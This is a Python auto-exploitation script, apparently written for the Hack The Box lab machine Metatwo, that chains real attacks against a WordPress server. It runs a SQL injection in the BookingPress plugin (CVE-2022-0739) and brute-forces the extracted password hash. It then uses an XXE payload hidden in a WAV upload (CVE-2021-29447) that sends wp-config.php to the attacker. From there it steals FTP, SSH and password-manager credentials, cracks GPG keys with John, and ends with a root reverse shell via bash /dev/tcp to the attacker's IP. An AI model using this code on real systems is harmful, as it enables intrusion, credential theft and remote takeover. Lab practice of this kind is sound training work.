#!/usr/env/bin python3

"""
Metatwo Autopwn HTB
-------------------
Author: Marss
Date: 10 Nov, 2022
"""
import pdb
import argparse
import base64
import gzip
import os
import paramiko
import re
import requests
import shlex
import signal
import socket
import subprocess
import sys
import threading

from ftplib import FTP
from passlib.hash import phpass
from pwn import *
from threading import Thread


## Ctrl + c
# (function)
def signal_handler(signum, frame):
	sys.exit("\n[!] User terminated.")

# (signal)
signal.signal(signal.SIGINT, signal_handler)


## Main class
class Exploit:

	def __init__(self, args):
		"""
		Initialize variables to all process:
		
		Remember add metapress.htb domain to /etc/hosts
		"""
		self.target_host = {
			'ip_address' : '10.10.11.186', 
			'url_domain' : 'http://metapress.htb'
		}

		self.ip_address = args.ip
		self.port = args.port

		self.compressed_wordlist = 'rockyou.txt.gz'
		self.credentials = {}

		self.stop_threads = False

		self.wav_file_name = 'malicious.wav'
		self.dtd_file_name = 'malicious.dtd'

		self.log_file_name = 'xxe_request.log'

		self.exposed_ftp_file = 'send_email.php'

		self.passpie_keys_file = 'passpie_keys'
		self.passpie_private_key = 'passpie_private_key'

	def run(self):
		"""
		Exploit process: 
		(1) Bookpress plugin [CVE-2022-0739] (Unauthenticated SQL injection)
			* Wordpress manager user credentials
			* Decrypt manager password [Bruteforce]
		
		(2) Media library [CVE-2021-29447] (Authenticated XXE [PHP 8])
			* wp-config.php: metapress.htb FTP credentials
		
		(3) FTP login (Leakage Information)
			* send_email.php: jnelson PHPMailer credentials
		
		(4) SSH login (Reused Credentials)
			* Crack GPG keys of Password Manager [passpie]
			* Export encrypted credentials in plaintext
		
		(5) Pivot to root user
			* Send reverse shell ?
		"""

		with log.progress('Starting Attack') as progress:

			progress.status('Unauthenticated SQL injection (CVE-2022-0739)'); time.sleep(2)
			manager_password_hash = self.sql_injection()
			log.info('extracted manager user password hash (CVE-2022-0739)')

			progress.status('Starting Brute-force attack'); time.sleep(2)
			with log.progress('Cracking password') as progress_2:
				self.bruteforce_attack(manager_password_hash, self.get_wordlist(), progress_2)
			log.success('manager password -> {}'.format(self.credentials['manager']))

			progress.status('Authenticated XXE [PHP 8] (CVE-2021-29447)'); time.sleep(2)
			self.create_xxe_files(target_file_path="../wp-config.php")
			log.info('malicious XXE files created : {}, {} (CVE-2021-29447)'.format(self.wav_file_name, self.dtd_file_name))
			
			progress.status('Uploading .wav file to receive wp-config.php'); time.sleep(2)
			self.wordpress_authentication()
			log.info('xxe attack requests log file : {}'.format(self.log_file_name))

			progress.status('Extracting FTP credentials of log_file'); time.sleep(2)
			self.extract_ftp_credentials()
			log.success('ftp credentials -> {}:{} (Leakage Information)'.format(self.credentials['ftp_user'], self.credentials['ftp_pass']))
			
			progress.status('FTP logging to extract SSH credentials from exposed file ({})'.format(self.exposed_ftp_file)); time.sleep(2)
			self.ftp_login()
			log.success('ssh credentials -> {}:{} (Reused Credentials)'.format(self.credentials['ssh_user'], self.credentials['ssh_pass']))

			progress.status('SSH loggin to extract GPG keys of Password Manager (passpie)'); time.sleep(2)
			self.download_keys_file(
				ssh_client=self.ssh_connection(
					self.credentials['ssh_user'], 
					self.credentials['ssh_pass']
				)
			)
			log.info('extracted gpg keys file : {}'.format(self.passpie_keys_file))

			progress.status('Extracting private key of gpg key file'); time.sleep(2)
			self.extract_pgp_private_key()
			log.info('gpg private key file : {}'.format(self.passpie_private_key))
			
			progress.status('Cracking gpg private key with John the Ripper'); time.sleep(2)
			self.crack_gpg_key()
			log.success('cracked passpie password -> {}'.format(self.credentials['passpie_pass']))

			progress.status('SSH login to extract root password'); time.sleep(2)
			self.extract_root_pass(
				ssh_client=self.ssh_connection(
					self.credentials['ssh_user'],
					self.credentials['ssh_pass']
				)
			)
			log.success('extracted root password -> {}'.format(self.credentials['root_pass']))

			progress.status('Running reverse shell as root user to get a shell'); time.sleep(2)
			self.get_shell()

	def extract_wp_nonce(self, response, nonce_type):
		try:
			if nonce_type == 1:			
				return re.findall("_wpnonce:'(.*?)'", response.text)[0]
			elif nonce_type == 2:
				return re.findall('"_wpnonce":"(.*?)"', response.text)[0]
			
		except Exception as error:
			sys.exit("\n[X] Error: %s" % error)

	def sql_injection(self):
		try:
			response = requests.get(self.target_host['url_domain'] + '/events/')

			wp_nonce = self.extract_wp_nonce(response, 1)

			post_data = {
				'action' : 'bookingpress_front_get_category_services',
				'_wpnonce' : wp_nonce,
				'category_id' : '1',
				'total_service' : '-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, user_pass, 0x7c) from wp_users#'
			}

			response = requests.post(self.target_host['url_domain'] + '/wp-admin/admin-ajax.php', 
				data=post_data)

			manager_password_hash = re.findall("\|(.*?)\|", response.text)[1]

			return manager_password_hash

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)
	
	def get_wordlist(self):
		with gzip.open(self.compressed_wordlist, mode='rt', errors='replace') as file: # errors='replace' (UnicodeDecodeError)
			wordlist = file.readlines()
		
		return wordlist

	def divide_wordlist(self, wordlist, wordlist_len):
		"""
		yield:

		keyword to return a value like any function 
		but in its next execution it will start from its last call 
		"""
		for i in range(0, len(wordlist), wordlist_len):
			yield wordlist[i:i + wordlist_len]

	def bruteforce_attack(self, password_hash, complete_wordlist, progress_log):
		"""
		Thread implementation

		Split wordlist into subwordlists based on number of threads
		"""
		num_threads = 50 # testing 50 (1:58)
		
		wordlist_list = list(self.divide_wordlist(complete_wordlist, (len(complete_wordlist) // num_threads)))

		password_hash = password_hash.replace("\/", "/") # remove escape character
		rounds, salt = self.extract_hash_parts(password_hash)

		threads_list = []
		# add each sublist to thread list
		for sub_wordlist in wordlist_list:
			threads_list.append(
				Thread(
					target=self.decrypt_password_hash, 
					args=(password_hash, rounds, salt, sub_wordlist, progress_log)
				))

		# start list threads
		for thread in threads_list:
			thread.start()
		# waits for threads to terminate
		for thread in threads_list:
			thread.join()

	def extract_hash_parts(self, password_hash):
		"""
		  $P$       B      4aNM28N0  E.tMy/JIcnVMZbGcU16Q70
		{prefix} {rounds}   {salt}         {checksum}
		           1 ch      8 ch             22 ch
		"""
		rounds = int(password_hash[3], base=16) + 2 # encoding a 6-bit integer
		salt = password_hash[4:12]
		
		return rounds, salt

	def decrypt_password_hash(self, password_hash, rounds, salt, sub_wordlist, progress_log):
		try:
			for word in sub_wordlist:
				if self.stop_threads:
					break

				progress_log.status(word.strip())
				_hash = phpass.hash(word.strip(), salt=salt, rounds=rounds)

				if _hash == password_hash:
					self.credentials['manager'] = word.strip()
					self.stop_threads = True
					break
					
		except Exception as error:
			sys.exit("\n[X] Error: %s" % error)

	def create_xxe_files(self, target_file_path):
		"""
		(1) .wav file 
		(2) .dtd file
		"""
		# (1)
		wav_file_content = "RIFFXXXXWAVEiXMLBBBB<?xml version=\"1.0\"?><!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://{}:{}/{}\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>>" \
			.format(self.ip_address, self.port, self.dtd_file_name)

		with open(self.wav_file_name, "wb") as file:
			file.write(wav_file_content.encode())

		# extrac file size
		wav_file_object = os.stat(self.wav_file_name)
		wav_size_bytes = wav_file_object.st_size

		# calcule bytes of xml payload (important to work!)
		little_endian_bytes = chr(wav_size_bytes - 20) + "\x00\x00" # 0xc2 added (weird behavior) ?

		wav_file_content = wav_file_content.replace("BBBB", little_endian_bytes)
		
		with open(self.wav_file_name, "wb") as file:
			file.write(wav_file_content.encode())
		
		# (2)
		dtd_file_content = "<!ENTITY % data SYSTEM \"php://filter/read=convert.base64-encode/resource={}\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://{}:{}/?=%data;'>\">" \
		.format(target_file_path, self.ip_address, self.port)
		
		with open(self.dtd_file_name, "wt") as file:
			file.write(dtd_file_content)

	def share_server(self):
		"""
		Create server with python to receive XXE response (wp-config.php)
		and save into a log file
		"""
		with open(self.log_file_name, 'wt') as log_file:
			command = "python3 -m http.server {}".format(self.port)
			python_server = subprocess.Popen(shlex.split(command), stdout=log_file, stderr=log_file)
			
		return python_server

	def wordpress_authentication(self):
		"""
		(1) Login with manager credentials
		(2) Upload malicious .wav file
		"""
		try:
			with requests.Session() as session:
				# (1)
				headers = { 'Content-type' : 'application/x-www-form-urlencoded' }

				form_data = {
					'log' : list(self.credentials.keys())[0],
					'pwd' : self.credentials['manager'],
					'wp-submit' : 'Log+In' 
				}

				session.post(self.target_host['url_domain'] + '/wp-login.php', 
					headers=headers, 
					data=form_data)

				# (2)
				file_data = {
					'async-upload' : (
						self.wav_file_name,
						open(self.wav_file_name, 'rb'),
						'audio/wav'
					),
				}

				response = session.get(self.target_host['url_domain'] + '/wp-admin/media-new.php')

				wp_nonce = self.extract_wp_nonce(response, 2)

				form_data = {
					'_wpnonce' : wp_nonce
				}

				# implement subprocess to receive log requests
				server_process = self.share_server()

				# upload file
				session.post(self.target_host['url_domain']  + '/wp-admin/async-upload.php', 
					files=file_data, 
					data=form_data)
				
				# terminate process
				server_process.kill()

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def extract_ftp_credentials(self):
		with open(self.log_file_name, 'rt') as log_file:
			log_content = log_file.readlines()

		# extract base64 content of log file
		base64_content = re.findall("GET /\?=(.*?) HTTP/1.1", log_content[1])[0]

		# decode base64 content
		base64_bytes = base64_content.encode('ascii')
		content_bytes = base64.b64decode(base64_bytes)
		plaintext_content = content_bytes.decode('ascii')

		# get ftp credentials
		self.credentials['ftp_user'] = re.findall("'FTP_USER', '(.*?)'", plaintext_content)[0]
		self.credentials['ftp_pass'] = re.findall("'FTP_PASS', '(.*?)'", plaintext_content)[0]
		
	def ftp_login(self):
		"""
		Login to ftp and download send_mailer.php 
		and extract jnelson credentials
		"""
		try:
			ftp_session = FTP('metapress.htb', 
				user=self.credentials['ftp_user'], 
				passwd=self.credentials['ftp_pass'])

			with open(self.exposed_ftp_file, 'wb') as file:
				ftp_session.retrbinary(f"RETR /mailer/{self.exposed_ftp_file}", file.write)

			with open(self.exposed_ftp_file, 'r') as ftp_file:
				ftp_content = ftp_file.read()
				
				self.credentials['ssh_user'] = re.findall("\$mail->Username = \"(.*?)\"", ftp_content)[0].split("@")[0]
				self.credentials['ssh_pass'] = re.findall("\$mail->Password = \"(.*?)\"", ftp_content)[0]

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def download_keys_file(self, ssh_client):
		"""
		SSH connection like jnelson to extract passpie .keys file
		"""
		with ssh_client.open_sftp() as sftp_client:
			sftp_client.get("/home/jnelson/.passpie/.keys", f"./{self.passpie_keys_file}")

		ssh_client.close()

	def ssh_connection(self, ssh_user, ssh_pass):
		"""
		SSH connection like a user
		"""
		try:
			ssh_client = paramiko.SSHClient()
			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh_client.connect(self.target_host['ip_address'], 
				port=22,
				username=ssh_user, 
				password=ssh_pass)

			return ssh_client

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def extract_pgp_private_key(self):
		with open(self.passpie_keys_file, "rt") as keys_file:
			keys_file_content = keys_file.read()

		passpie_private_key_content = re.findall("(?s)-----BEGIN .+?-----.+?-----END .+?-----\n", keys_file_content)[1]

		with open(self.passpie_private_key, "wt") as key_file:
			key_file.write(passpie_private_key_content)

	def crack_gpg_key(self):
		try:
			# create gpg hash with john
			command = 'gpg2john passpie_private_key > passpie_private_key_hash'
			crack_process = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

			# crack gpg hash
			command = 'john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie_private_key_hash'
			john_output = subprocess.run(command, capture_output=True, shell=True)
			
			# extract passpie password
			if "No password hashes left to crack (see FAQ)" in john_output.stdout.decode():
				# if has been cracked before
				john_output = subprocess.run("john --show passpie_private_key_hash", capture_output=True, shell=True)
				self.credentials['passpie_pass'] = re.findall("(Passpie:.*):::", john_output.stdout.decode())[0].split(':')[1]

				return

			# first time cracking
			self.credentials['passpie_pass'] = re.findall("(.*?)\s+\(Passpie\)", john_output.stdout.decode())[0]

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def extract_root_pass(self, ssh_client):
		"""
		SSH connection like jnelson to export users credentials in plaintext
		"""
		with ssh_client as ssh_client:
			# create personal workstation
			ssh_client.exec_command("mkdir -p /tmp/.{}".format(self.ip_address))
			
			# save credentials
			_stdin, _stdout, _stderr = ssh_client.exec_command("passpie export /tmp/.{}/user_credentials".format(self.ip_address))
			_stdin.write(self.credentials['passpie_pass'] + "\n")
			_stdin.flush()

			# wait until the file is created
			time.sleep(5)
			
			# open credentials file and extract root password
			_stdin, _stdout, _stderr = ssh_client.exec_command("cat /tmp/.{}/user_credentials".format(self.ip_address))
			
			self.credentials['root_pass'] = re.findall("password: .*? '(.*?)'\s", _stdout.read().decode())[0]

			# remove personal workstation
			ssh_client.exec_command("rm -r /tmp/.{}".format(self.ip_address))

	def get_shell(self):
		"""
		Send reverse shell to local machine
		"""
		try:
			ssh_client = self.ssh_connection(self.credentials['ssh_user'], self.credentials['ssh_pass'])

			reverse_shell = "su root -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(self.ip_address, self.port)
			_stdin, _stdout, _stderr = ssh_client.exec_command(reverse_shell)
			_stdin.write(self.credentials['root_pass'] + '\n')
			_stdin.flush()

			shell = listen(self.port, timeout=20).wait_for_connection()

			if shell.sock:
				log.info('Press Ctrl + D to exit.')
				shell.interactive()

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

## Main flow
if __name__ == '__main__':
	ascii_title = """
	|\/|  _  _|_  _. _|_       _     /\      _|_  _  ._       ._  
	|  | (/_  |_ (_|  |_ \/\/ (_)   /--\ |_|  |_ (_) |_) \/\/ | |
	                                                 |
	                                                         by marss
	"""

	parser = argparse.ArgumentParser(
		description=ascii_title,
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		""")

	parser.add_argument('-i', '--ip', required=True, help="Specified IP to receive the shell")
	parser.add_argument('-p', '--port', required=True, help="Specified PORT to receive the shell")

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)

	exploit.run()
